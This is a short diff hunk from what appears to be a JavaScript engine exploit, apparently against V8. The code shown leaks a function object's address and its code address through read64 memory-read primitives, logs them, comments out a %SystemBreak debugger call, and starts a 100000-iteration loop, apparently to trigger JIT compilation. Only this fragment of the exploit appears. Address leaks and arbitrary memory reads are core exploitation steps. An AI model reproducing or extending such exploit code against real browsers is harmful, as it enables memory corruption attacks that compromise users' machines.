@@ -88,7 +88,7 @@ function t(i, obja) {
 	console.log("[*] leak t addr : 0x" + hex(leak_t_addr));
 	var leak_t_code_addr = read64(leak_t_addr + 0x41n);
 	console.log("[*] leak t code addr : 0x" + hex(leak_t_code_addr));
-	%SystemBreak();
+	// %SystemBreak();
 }
 
 for (var i = 0; i < 100000; i++)
